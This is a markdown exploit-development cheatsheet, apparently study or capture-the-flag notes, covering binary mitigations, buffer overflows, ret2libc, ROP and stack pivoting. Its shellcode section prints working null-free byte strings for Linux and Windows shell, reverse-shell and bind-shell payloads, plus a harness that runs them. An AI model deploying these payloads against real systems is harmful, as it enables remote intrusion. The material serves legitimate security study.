# Exploit-Cheatsheet

## Basics

### Assembly

#### Calling Convention

| Name | Architecture | OS | Integer Arguments | Floating Point Arguments | Integer Return Value | Floating Point Return Value | System Call Number | Callee-saved Registers | Caller-saved Registers |
| :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: |
| System V ABI | x64 | Linux, BSD, Solaris | `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`, stack RTL | `xmm0` ~ `xmm7` | `rax` | `xmm0` | N/A | `rbx`, `rbp`, `rsp`, `r12`, `r13`, `r14`, `r15` | Others |
| System V ABI (syscall) | x64 | Linux, BSD, Solaris | `rdi`, `rsi`, `rdx`, `r10`, `r8`, `r9` | N/A | `rax` | N/A | `rax` | N/A | N/A |
| Microsoft x64 | x64 | Windows, UEFI | `rcx`, `rdx`, `r8`, `r9`, stack RTL | `xmm0` ~ `xmm3` | `rax` | `xmm0` | N/A | `rbx`, `rbp`, `rdi`, `rsi`, `rsp`, `r12`, `r13`, `r14`, `r15` | Others |

### Cross Compiling & Cross Debugging

#### Cross Compiling

```bash
aarch64-linux-gnu-gcc vuln.c -o vuln
```

#### Cross Debugging

One terminal:
```bash
qemu-aarch64 -g 1234 vuln
```
Another terminal:
```bash
gdb-multiarch
(gdb) file vuln
(gdb) set architecture aarch64
(gdb) target remote localhost:1234
```

### ASLR

* ASLR randomizes the address space location of a process
* Some randomized adderss space locations:
    * stack
    * heap
    * libraries
    * mmap addresses
    * Ehe base of the executable
* Turn on/off ASLR
    * Controled by `/proc/sys/kernel/randomize_va_space`
        * 0: Turn off ASLR
        * 1: Stack, libraries, and mmap addresses are randomized. **Heap is not randomized**
        * 2: Stack, heap, libraries, and mmap addresses are all randomized.
* Finding the address/offset of functions
    * e.g. `system`
        ```bash!
        readelf -W -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
        ```
* Finding the address/offset of a string
    * e.g. `"/bin/sh"`
        ```bash!
        strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
        ```

### ELF Security properties

#### NX

* Stands for non-executable.
* Similar to DEP on Windows.
* Mark writable areas of memory as non-executable.
* Check if NX is enabled:
    * Check whether `GNU_STACK` is `RW` or `RWX`
        ```bash!
        readelf -W -l ./binary | grep GNU_STACK
        ```
* Compiler flags:
    * NX is enabled by default
    * `-z execstack`: disable NX

#### Canary

* Unpredictable values that are placed between variables and return addresses on the stack.
* The unpredictable value is obtained from `fs:0x28`
* Canary always ends with `\0` (Prevent null byte overflow)
* Check if canary is enabled:
    * Detect `__stack_chk_fail` or `__intel_security_cookie` function
        ```bash!
        readelf -W -s ./binary | grep -E '__stack_chk_fail|__intel_security_cookie'
        ```
* Compiler flags:
    * `-fstack-protector-all`: enable canary
    * `-fno-stack-protector`: disable canary

#### RELRO

* Stands for Relocation Read-Only.
* Determine whether the Global Offset Table (GOT) is readonly.
* Types of RELRO:
    * No RELRO: `.got` and `.got.plt` are marked as readable and writable.
    * Partial RELRO: `.got` is read only, but `.got.plt` is writeable.
    * Full RELRO: `.got` and `.got.plt` are marked as readonly.
* Check if RELRO is enabled:
    * No RELRO: The `GNU_RELRO` segment does not exist.
    * Partial RELRO: `GNU_RELRO` exists, but the `BIND_NOW` tag does not exist.
    * Full RELRO: Both `GNU_RELRO` and `BIND_NOW`  exist.
        ```bash!
        readelf -W -l ./binary | grep GNU_RELRO
        readelf -W -d ./binary | grep BIND_NOW
        ```
* Compiler flags
    * `-Wl,-z,relro,-z,now`: Full RELRO
    * `-Wl,-z,relro`: Partial RELRO
    * `-Wl,-z,norelro`: No RELRO

#### PIE

* Stands for position-independent executable
* Most of the time, PIE is enabled only for libraries
* Check if PIE is enabled:
    * Check if `e_type` is `ET_EXEC` (non-PIE) or `ET_DYN` (PIE)
* Compiler flags
    * `-fpie`: enable PIE
    * `-fno-pie`: disable PIE

#### Fortify

* Enabling the `FORTIFY_SOURCE` macro
* Dangerous functions (such as `memcpy`, `strcpy`, ...) will be checked at compile-time or run-time. 
    * Dangerous functions will be replaced with fortified functions (such as `__memcpy_chk`, `__strcpy_chk`, ...) that checks for a potential buffer overflow.
* Enable `FORTIFY_SOURCE`
    * `-D_FORTIFY_SOURCE=1`: adds checks at compile time only.
    * `-D_FORTIFY_SOURCE=2`: adds checks at compile-time and run-time.

#### checksec

* Identify security properties on Linux binaries
* e.g.
    ```bash!
    checksec --file=/usr/bin/python3
    ```
    ```
    [*] '/usr/bin/python3'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
        FORTIFY:  Enabled
    ```

### Windows Process Mitigation

#### DEP

* Stands for *Data Execution Prevention*
* Similar to NX on Linux
* Mark writable areas of memory as non-executable

#### SEHOP

* Stands for *Structured Exception Handling Overwrite Protection*
* Helps prevent SEH Overwriting

#### ASLR

* Randomizes the address space location of a process
* Some randomized address space locations:
    * Executables
    * DLLs
    * heap
    * stack
    * PEB
    * TEB

## Buffer overflow

* Scenario:
    * When program writes more bytes to a buffer than the number of bytes requested, changing adjacent memory values.

### Example

```c
#include <stdio.h>
int main(int argc, char **argv)
{
    char buf[8];
    gets(buf);
    printf("%s\n", buf);
    return 0;
}
```
* `gets` can read data of any length. As a result, more than 8 bytes of data can be intentionally store on the buffer.

### Dangerous C functions

* `gets`
    * Mitigation: `fgets`
* `scanf("%s")`, `fscanf("%s)`, `sscanf("%s")`, ...
    * Mitigation: `scanf("%80s")`, `read`, `fgets`, ...
* `strcpy`
    * Mitigation: `strncpy`
* `strcat`
    * Mitigation: `strncat`
* `sprintf`
    * Mitigation: `snprintf`
* `getcwd`, `getwd`
* `realpath`

### Stack Overflow

#### Executable Stack

See [Shellcode](#Shellcode-1).

#### Non-executable Stack

See [Ret2win](#return-to-win-ret2win), [Ret2libc](#Return-to-libc-ret2libc), and [ROP](#Return-Oriented-Programming-ROP).

### Heap Overflow

## Shellcode

### Linux

#### Spawn Shell

* Equivalent C code
    ```c
    execve("/bin/sh", NULL, NULL);
    ```
* x64
    * Null Free, 22 Bytes
        * `"\x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xf7\xee\xb0\x3b\x0f\x05"`
        * [source](shellcode/Linux_x64/execve_null_free.s)
* x86
    * Null Free, 22 Bytes
        * `"\x31\xc0\x31\xc9\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x34\x0b\xcd\x80"`
        * [source](shellcode/Linux_x86/execve_null_free.s)

#### Reverse Shell

* Equivalent C code
    ```c
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(31337);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    dup2(sockfd, 2);
    dup2(sockfd, 1);
    dup2(sockfd, 0);
    execve("/bin/sh", NULL, NULL);
    ```
* x64
    * Null Free, 65 bytes
        * `"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x68\x7f\x01\x01\x01\x66\x68\x7a\x69\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x89\xfe\xb0\x21\x0f\x05\xff\xce\x79\xf8\x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x99\xb0\x3b\x0f\x05"`
        * [source](shellcode/Linux_x64/reverse_null_free.s)
* x86
    * Null Free, 66 bytes
        * `"\x6a\x66\x58\x99\x31\xdb\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x59\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x2b\x67\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x08"`
        * [source](shellcode/Linux_x86/reverse_null_free.s)

#### Bind Shell

* Equivalent C code
    ```c
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(31337);
    addr.sin_addr.s_addr = INADDR_ANY;
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    listen(sockfd, 0);
    int new_sockfd = accept(sockfd, NULL, NULL);
    dup2(new_sockfd, 2);
    dup2(new_sockfd, 1);
    dup2(new_sockfd, 0);
    execve("/bin/sh", NULL, NULL);
    ```
* x64
    * Null Free, 74 bytes
        * `"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\xb0\x31\x52\x66\x68\x7a\x69\x66\x6a\x02\x54\x5e\xb2\x10\x0f\x05\xb0\x32\x31\xf6\x0f\x05\xb0\x2b\x99\x0f\x05\x48\x97\x89\xfe\xb0\x21\x0f\x05\xff\xce\x79\xf8\x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x99\xb0\x3b\x0f\x05"`
        * [source](shellcode/Linux_x64/bind_null_free.s)
* x86
    * Null Free, 90 bytes
        * `"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x68\x7a\x69\x00\x00\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"`
        * [source](shellcode/Linux_x86/bind_null_free.s)

### Windows

#### Reverse Shell

* Equivalent C code
    ```c
    WSADATA wsaData;
    WSAStartup(0, &wsaData);
    SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4242);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    connect(sockt, (struct sockaddr *)&addr, sizeof(addr));
    STARTUPINFO sinfo;
	PROCESS_INFORMATION pinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
	sinfo.hStdInput = (HANDLE)sockt;
	sinfo.hStdOutput = (HANDLE)sockt;
	sinfo.hStdError = (HANDLE)sockt;
    CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
    ```
* x86
    * Null Free, 298 bytes
        * `"\x33\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x03\xd3\x8b\x52\x78\x03\xd3\x8b\x72\x20\x03\xf3\x33\xc9\x49\x41\xad\x03\xc3\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x8b\x72\x24\x03\xf3\x66\x8b\x0c\x4e\x8b\x72\x1c\x03\xf3\x8b\x3c\x8e\x03\xfb\x53\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd7\x66\x53\x66\x68\x6c\x6c\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\xd0\x96\x66\x53\x66\x68\x75\x70\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x56\xff\xd7\x33\xc9\x66\xb9\x90\x01\x2b\xe1\x54\x51\xff\xd0\x66\x53\x66\x68\x74\x41\x68\x6f\x63\x6b\x65\x68\x57\x53\x41\x53\x54\x56\xff\xd7\x33\xc9\x51\x51\x51\x6a\x06\x6a\x01\x6a\x02\xff\xd0\x95\x68\x01\x65\x63\x74\xc1\x2c\x24\x08\x68\x63\x6f\x6e\x6e\x54\x56\xff\xd7\x68\xb2\x80\x12\x7a\x66\x68\x10\x92\x66\x6a\x02\x8b\xcc\x6a\x10\x51\x55\xff\xd0\x53\x66\x68\x73\x41\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\x53\xff\xd7\x68\x01\x63\x6d\x64\xc1\x2c\x24\x08\x8b\xdc\x83\xec\x10\x8b\xfc\x55\x55\x55\x33\xd2\x52\x52\xb6\x01\x52\x33\xd2\x6a\x09\x59\x52\xe2\xfd\x52\x6a\x44\x8b\xd4\x57\x52\x51\x51\x51\x6a\x01\x51\x51\x53\x51\xff\xd0"`
        * [source](shellcode/Windows_x86/reverse_null_free.asm)

### Shellcode Testing
* From string
Source (`sc.c`)
```c
int main() {
    char shellcode[] = ""; // shellcode
    int (*run)() = (int(*)())shellcode;
    run();
}
```
* From file
```c
#include <stdio.h>
#include <stdlib.h>
#define SHELLCODE_LENGTH 4096
int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "usage: ./shellcode_test [BINARY FILE]");
        exit(EXIT_FAILURE);
    }
    char shellcode[SHELLCODE_LENGTH]; // shellcode
    FILE *fp = fopen(argv[1], "rb");
    if (fp == NULL) {
        fprintf(stderr, "Cannot open file %s\n", argv[1]);
        exit(EXIT_FAILURE);
    }
    fread(shellcode, SHELLCODE_LENGTH, 1, fp);
    if (ferror(fp)) {
        fprintf(stderr, "Cannot read file %s\n", argv[1]);
        exit(EXIT_FAILURE);
    }
    int (*run)() = (int(*)())shellcode;
    run();
}
```
* Compile
```bash
gcc sc.c -z execstack -o sc
```

### Common shellcoding techniques

#### Null byte prevention

* `xor rax, rax`: zero out `rax`, no null byte opcode
* Use existing values from registers/stack
    * e.g. if initially `rdi` is already 0, `xor rdi, rdi` becomes redundant.
* `mov rax, 0x30` → `push 0x30; pop rax`
* `push 0x697a0002` → `push word 0x697a; push word 0x2`
* `mov rax, [fs:0x0]` → `xor ecx, ecx ; mov rax, [fs:rcx]`

#### shorten opcode

* `cdq` (1 byte): zero out `rdx` if `rax >= 0`
* `imul esi` (2 bytes): zero out `rdx` if `rsi == 0`
* `lodsd` (1 byte)
    * `mov eax, [esi]` (2 bytes) → `lodsd` (1 byte)
    * `mov eax, [esi + ecx * 4] (3 bytes) → `lodsd` (1 byte)
* `push rax` 16 times →
   ```
   push 0x10
   pop ecx
   repeat:
       push rax
       loop repeat
   ```
* `push 0x30; pop rax` (3 bytes) → `mov al, 0x30`
* `add eax, 1` (3 bytes), `inc rax` (3 bytes) → `inc eax` (2 bytes), `add al, 1` (2 bytes)
* `mov ecx, eax` (3 bytes), and `eax` is disposable → `xchg eax, ecx` (2 bytes)

#### nop sled

* NOP instructions do exactly nothing. In other words, all they do is run the next instruction.
* If you fill your shellcode with `nop`s on the left, it will keep doing nothing until it reaches your actual payload.
    * This gives us a larger margin of error when calculating the shellcode address.
* Some NOP instructions
    * x86 / x64
        * `nop` (1 byte)
        * `fnop` (2 bytes)
        * `xchg rax, rax` (2 bytes)
        * `push rax ; pop rax` (2 bytes)
        * `mov rax, rax` (3 bytes)
        * `inc eax ; dec eax` (4 bytes)
        * ...

#### Caveats

* if `eax == 0x000000ff`, then after `add al, 1`, `eax == 0x00000000`
    * use `inc ax`, `inc eax`, `inc rax` instead if you want `eax == 0x00000100`
* `mov [m64], imm64` is not possible
    * e.g., `mov [rax], 0x68732f2f6e69622f` is not possible. Change it to `mov rbx, 0x68732f2f6e69622f; mov [rax], rbx`

### Alphanumeric Shellcode

#### Linux x64

* Prefixes
    <details>
    <summary>Expand</summary>

    | Opcode | Prefix Description | Example Instruction | Example Opcode |
    | :-: | :-: | :-: | :-: |
    | `f` | 16-bit operand size | `push rax` → `push ax` | `P` → `fP` |
    | `g` | 16-bit address size | `xor [rax], dh` → `xor [eax], dh` | `00` → `g00` |
    | `H` | 64-bit register size override | `xor eax, 0x30303030` → `xor rax, 0x30303030` | `50000` → `H50000` |
    | `6` | ss segment override | `xor [rcx+0x30], rax` → `xor [ss:rcx+0x30], rax` | `H1A0` →`6H1A0` |
    | `d` | fs segment override | `xor rax, [rcx+0x30]` → `xor rax, [fs:rcx+0x30]` | `H3A0` → `dH3A0` |
    | `e` | gs segment override | `xor rax, [rcx+0x30]` → `xor rax, [gs:rcx+0x30]` | `H3A0` → `eH3A0` |
    </details>
* Operands
    <details>
    <summary>Expand</summary>

    * Layer 1
        | Operand | Changed register | Changed Memory |
        | :-: | :-: | :-: |
        | `0` | `esi` | `[rax]` |
        | `1` | `esi` | `[rcx]` |
        | `2` | `esi` | `[rdx]` |
        | `3` | `esi` | `[rbx]` |
        | `4*` | `esi` | `[*]` |
        | `5####` | `esi` | `[rip + ####]` |
        | `6` | `esi` | `[rsi]` |
        | `7` | `esi` | `[rdi]` |
        | `8` | `edi` | `[rax]` |
        | `9` | `edi` | `[rcx]` |
        | `A#` | `eax` | `[rcx + #]` |
        | `B#` | `eax` | `[rdx + #]` |
        | `C#` | `eax` | `[rbx + #]` |
        | `D*#` | `eax` | `[* + #]` |
        | `E#` | `eax` | `[rbp + #]` |
        | `F#` | `eax` | `[rsi + #]` |
        | `G#` | `eax` | `[rdi + #]` |
        | `H#` | `ecx` | `[rax + #]` |
        | `I#` | `ecx` | `[rcx + #]` |
        | `J#` | `ecx` | `[rdx + #]` |
        | `K#` | `ecx` | `[rbx + #]` |
        | `L*#` | `ecx` | `[* + #]` |
        | `M#` | `ecx` | `[rbp + #]` |
        | `N#` | `ecx` | `[rsi + #]` |
        | `O#` | `ecx` | `[rdi + #]` |
        | `P#` | `edx` | `[rax + #]` |
        | `Q#` | `edx` | `[rcx + #]` |
        | `R#` | `edx` | `[rdx + #]` |
        | `S#` | `edx` | `[rbx + #]` |
        | `T*#` | `ecx` | `[* + #]` |
        | `U#` | `edx` | `[rbp + #]` |
        | `V#` | `edx` | `[rsi + #]` |
        | `W#` | `edx` | `[rdi + #]` |
        | `X#` | `ebx` | `[rax + #]` |
        | `Y#` | `ebx` | `[rcx + #]` |
        | `Z#` | `ebx` | `[rdx + #]` |
        | `a#` | `esp` | `[rcx + #]` |
        | `b#` | `esp` | `[rdx + #]` |
        | `c#` | `esp` | `[rbx + #]` |
        | `d*#` | `esp` | `[* + #]` |
        | `e#` | `esp` | `[rbp + #]` |
        | `f#` | `esp` | `[rsi + #]` |
        | `g#` | `esp` | `[rdi + #]` |
        | `h#` | `ebp` | `[rax + #]` |
        | `i#` | `ebp` | `[rcx + #]` |
        | `j#` | `ebp` | `[rdx + #]` |
        | `k#` | `ebp` | `[rbx + #]` |
        | `l*#` | `ebp` | `[* + #]` |
        | `m#` | `ebp` | `[rbp + #]` |
        | `n#` | `ebp` | `[rsi + #]` |
        | `o#` | `ebp` | `[rdi + #]` |
        | `p#` | `esi` | `[rax + #]` |
        | `q#` | `esi` | `[rcx + #]` |
        | `r#` | `esi` | `[rdx + #]` |
        | `s#` | `esi` | `[rbx + #]` |
        | `t*#` | `esi` | `[* + #]` |
        | `u#` | `esi` | `[rbp + #]` |
        | `v#` | `esi` | `[rsi + #]` |
        | `w#` | `esi` | `[rdi + #]` |
        | `x#` | `edi` | `[rax + #]` |
        | `y#` | `edi` | `[rcx + #]` |
        | `z#` | `edi` | `[rdx + #]` |
    * Layer 2
        | Operand | Changed register |
        | :-: | :-: |
        | `*0` | `rax + rsi` |
        | `*1` | `rcx + rsi` |
        | `*2` | `rdx + rsi` |
        | `*3` | `rbx + rsi` |
        | `*4` | `rsp + rsi` |
        | `*5` | `rbp + rsi` |
        | `*6` | `rsi + rsi` |
        | `*7` | `rdi + rsi` |
        | `*8` | `rax + rdi` |
        | `*9` | `rcx + rdi` |
        | `*A` | `rcx + rax*2` |
        | `*B` | `rdx + rax*2` |
        | `*C` | `rbx + rax*2` |
        | `*D` | `rsp + rax*2` |
        | `*E` | `rbp + rax*2` |
        | `*F` | `rsi + rax*2` |
        | `*G` | `rdi + rax*2` |
        | `*H` | `rax + rcx*2` |
        | `*I` | `rcx + rcx*2` |
        | `*J` | `rdx + rcx*2` |
        | `*K` | `rbx + rcx*2` |
        | `*L` | `rsp + rcx*2` |
        | `*M` | `rbp + rcx*2` |
        | `*N` | `rsi + rcx*2` |
        | `*O` | `rdi + rcx*2` |
        | `*P` | `rax + rdx*2` |
        | `*Q` | `rcx + rdx*2` |
        | `*R` | `rdx + rdx*2` |
        | `*S` | `rbx + rdx*2` |
        | `*T` | `rsp + rdx*2` |
        | `*U` | `rbp + rdx*2` |
        | `*V` | `rsi + rdx*2` |
        | `*W` | `rdi + rdx*2` |
        | `*X` | `rax + rbx*2` |
        | `*Y` | `rcx + rbx*2` |
        | `*Z` | `rdx + rbx*2` |
        | `*h` | `rax + rbp*2` |
        | `*i` | `rcx + rbp*2` |
        | `*j` | `rdx + rbp*2` |
        | `*k` | `rbx + rbp*2` |
        | `*l` | `rsp + rbp*2` |
        | `*m` | `rbp + rbp*2` |
        | `*n` | `rsi + rbp*2` |
        | `*o` | `rdi + rbp*2` |
        | `*p` | `rax + rsi*2` |
        | `*q` | `rcx + rsi*2` |
        | `*r` | `rdx + rsi*2` |
        | `*s` | `rbx + rsi*2` |
        | `*t` | `rsp + rsi*2` |
        | `*u` | `rbp + rsi*2` |
        | `*v` | `rsi + rsi*2` |
        | `*w` | `rdi + rsi*2` |
        | `*x` | `rax + rdi*2` |
        | `*y` | `rcx + rdi*2` |
        | `*z` | `rdx + rdi*2` |
    * Example
        | Instruction | Opcode |
        | :-: | :-: |
        | `xor byte ptr [rax], dh` | `00` |
        | `xor byte ptr [rax + rsi], dh` | `040` |
        | `xor byte ptr [rcx + 0x30], al` | `0A0` |
        | `xor byte ptr [rax + rsi + 0x30], al` | `0D00` |
        | `xor byte ptr [rcx + rax*2 + 0x30], al` | `0DA0` |
    </details>

* `push`
    | Instruction | Opcode | Instruction | Opcode |
    | :-: | :-: | :-: | :-: |
    | `push rax` | `P` | `push ax` | `fP` |
    | `push rcx` | `Q` | `push cx` | `fQ` |
    | `push rdx` | `R` | `push dx` | `fR` |
    | `push rbx` | `S` | `push bx` | `fS` |
    | `push rsp` | `T` | `push sp` | `fT` |
    | `push rbp` | `U` | `push bp` | `fU` |
    | `push rsi` | `V` | `push si` | `fV` |
    | `push rdi` | `W` | `push di` | `fW` |
    | `push r8` | `AP` | `push r8w` | `fAP` |
    | `push r9` | `AQ` | `push r9w` | `fAQ` |
    | `push r10` | `AR` | `push r10w` | `fAR` |
    | `push r11` | `AS` | `push r11w` | `fAS` |
    | `push r12` | `AT` | `push r12w` | `fAT` |
    | `push r13` | `AU` | `push r13w` | `fAU` |
    | `push r14` | `AV` | `push r14w` | `fAV` |
    | `push r15` | `AW` | `push r15w` | `fAW` |
    | `push byte 0x30 ` | `j0` |
    | `push word 0x3030` | `fh00` |
    | `push 0x30303030` | `h0000` |
* `pop`
    | Instruction | Opcode | Instruction | Opcode |
    | :-: | :-: | :-: | :-: |
    | `pop rax` | `X` | `pop ax` | `fX` |
    | `pop rcx` | `Y` | `pop cx` | `fY` |
    | `pop rdx` | `Z` | `pop dx` | `fZ` |
    | `pop r8` | `AX` | `pop r8w` | `fAX` |
    | `pop r9` | `AY` | `pop r9w` | `fAY` |
    | `pop r10` | `AZ` | `pop r10w` | `fAZ` |
* `xor`
    | Instruction | Opcode | Example Instruction | Example Opcode |
    | :-: | :-: | :-: | :-: |
    | `xor al, imm8` | `4#` | `xor al, 0x30` | `40` |
    | `xor ax, imm16` | `f5##` | `xor ax, 0x3030` | `f500` |
    | `xor eax, imm32` | `5####` | `xor eax, 0x30303030` | `50000` |
    | `xor rax, imm32` | `H5####` | `xor rax, 0x30303030` | `H50000` |
    | `xor m64, r8` | `0*` | `xor byte ptr [rcx + 0x30], al` | `0A0` |
    | `xor m64, r8` | `1*` | `xor dword ptr [rax + rsi + 0x30], eax` | `1D00` |
    | `xor r8, m64` | `2*` | `xor al, byte ptr [rcx + 0x4f]` | `2A0` |
    | `xor r8, m64` | `3*` | `xor dword ptr eax, [rax + rsi + 0x30]` | `3D00` |

* `imul`
    | Instruction | Opcode | Example Instruction | Example Opcode |
    | :-: | :-: | :-: | :-: |
    | `imul r32, m32, imm8` | `k?#` | `imul esi, dword ptr [rsi], 0x30` | `k60` |
    | `imul r32, m32, imm32` | `i?####` | `imul esi, dword ptr [rdx], 0x30303030` | `i20000` |

#### Reference
* [x64 alphanumeric shellcode](https://nets.ec/Alphanumeric_shellcode)

### Resource

#### Opcode Table
* [x86](https://shell-storm.org/x86doc/)
* [x64](http://ref.x86asm.net/coder64.html)

#### Syscall Table
* [syscall table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)

#### Database
* [shell-storm shellcode database](https://shell-storm.org/shellcode/)
* [exploit-db shellcodes](https://www.exploit-db.com/shellcodes)

## Return-to-win (ret2win)

* Scenario
    * Stack overflow
    * Stack not writable
    * A backdoor `win` function exists in the binary.
* Methodology
    * Overwrite the return address to `win`.
* e.g.
    | Original stack layout | Overwritten stack layout |
    | :-: | :-: |
    | `local variable` | `local variable` |
    | `overflowed buffer` | **`0x41414141`** |
    | `overflowed buffer` | **`0x41414141`** |
    | `old stack frame` | **`0x41414141`** |
    | `return address` | **`win`** |

## Return-to-libc (ret2libc)

* Requirement
    * Stack overflow
    * Stack not executable
* Overwrite the **return address** to an address of a **libc subroutine**.
* Bypass canary
    * Leak canary
* Bypass ASLR
    * Leak **library address (Required)** / stack address / executable base address / ...
* e.g.
    | Original stack layout | Overwritten stack layout |
    | :-: | :-: |
    | `local variable` | `local variable` |
    | `overflowed buffer` | **`0x41414141`** |
    | `overflowed buffer` | **`0x41414141`** |
    | `old stack frame` | **`0x41414141`** |
    | `return address` | **`libc system address`** |
    | ... | **`dummy return address`** |
    | ... | **`"/bin/sh" address`** |

## Return Oriented Programming (ROP)

* Scenario
    * Stack overflow
    * Stack not writable
* Overwrite the **return address** to **ROP gadgets**.
* e.g.
    | Original stack layout | Overwritten stack layout |
    | :-: | :-: |
    | `local variable` | `local variable` |
    | `overflowed buffer` | **`0x41414141`** |
    | `overflowed buffer` | **`0x41414141`** |
    | `old stack frame` | **`0x41414141`** |
    | `return address` | **`pop rdi ; ret`** |
    | ... | **`"/bin/sh" address`** |
    | ... | **`xor rsi, rsi; ret`** |
    | ... | **`xor rdx, rdx; ret`** |
    | ... | **`syscall`** |

### Stack Pivoting

* Scenario
    * Stack overflow (at least 8 bytes).
    * There is a lack of space on the stack to perform a full ROP attack.
* Basic idea:
    * Place your ROP gadget in a larger, writable memory area.
    * Control the `rsp` register and move it there.
* Gadgets that change `rsp`:
    * `leave ; ret`
        * `leave ; ret` appears at the end of each function (function epilogue). Thus, this gadget can be easily found anywhere.
        * Only 8 bytes of buffer overflow is required.
        * Methodology:
            1. Through buffer overflow
                1. Change old `rbp` to a controllable, writable area (e.g. bss or heap). Let's name it `real_rop_addr`.
                2. Change the return address to `leave ; ret`.
            2. Place your real ROP gadget at `real_rop_addr + 0x8`.
        * Explanation
            1. Before a function returns, `rbp` is restored back to its old value (`real_rop_addr`).
            2. `leave` is equivalent to `mov rsp, rbp; pop rbp`, so
                1. After `mov rsp, rbp`, the value of `rbp` (`real_rop_addr`) is assigned to `rsp`.
                2. After `pop rbp`, `rsp` becomes `real_rop_addr + 0x8`.
                3. After `ret`, `rip` becomes `*(real_rop_addr + 0x8)`. 
        * e.g.
            | Original stack layout | Overwritten stack layout |
            | :-: | :-: |
            | `local variable` | `local variable` |
            | `overflowed buffer` | **`0x41414141`** |
            | `overflowed buffer` | **`0x41414141`** |
            | `old stack frame` | **`real_rop_addr`** |
            | `return address` | **`leave ; ret`** |
            
            | writable area (`real_rop_addr`) layout |
            | :-: |
            | `0x41414141` |
            | `real ROP chain` |
            | ... |
            | ... |
            | ... |
            | ... |
    * `pop rsp`
        * The most useful, but the least likely to exist
        * e.g.
            | Original stack layout | Overwritten stack layout |
            | :-: | :-: |
            | `local variable` | `local variable` |
            | `overflowed buffer` | **`0x41414141`** |
            | `overflowed buffer` | **`0x41414141`** |
            | `old stack frame` | **`0x41414141`** |
            | `return address` | **`pop rsp ; ret`** |
            | ... | `real_rop_addr` |
            
            | writable area (`real_rop_addr`) layout |
            | :-: |
            | `0x41414141` |
            | `real ROP chain` |
            | ... |
            | ... |
            | ... |
            | ... |
    * `mov rsp, <reg64>` or `xchg rsp, <reg64>`
        * Use a `pop <reg64>` gadget to store `real_rop_addr`. Then, use `xchg` or `mov` gadgets to set `rsp`.
        * Drawbacks
            * Requires more than 8 bytes
            * `mov rsp, <reg64>` and `xchg rsp, <reg64>` are more difficult to find.
        
### Tools

* [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
* [ropper](https://github.com/sashs/Ropper)

### ROP in x64, x86

* Loading a constant into register
    * `pop REG ; ret`
* Set register to 0
    * `xor REG, REG ; ret`
* Move / swap two registers
    * `mov REG1, REG2 ; ret`
    * `push REG1 ; pop REG2 ; ret`
* Arithmetics
    * `xor REG1, REG2 ; ret`
    * `add REG, 0x80 ; ret`
    * ...
* Loading value into register from memory
    * `mov REG, [rbp] ; ret`
* Loading value into memory from register
    * `mov [rbp], REG ; ret`
* Syscall
    * `syscall ; ret`
* Nop
    * `ret`
* Jump to another gadget ([stack pivoting](#Stack-pivoting))
    * `pop rsp ; ret`
    * `xchg REG, rsp`
    * `leave ; ret`

### ROP in aarch64

### Stack pivoting

* Scenario
    * Lack of space on the stack
* Methodology
    * Create a fake stack frames in another writable memory.
    * Change the stack pointer to that particular memory.
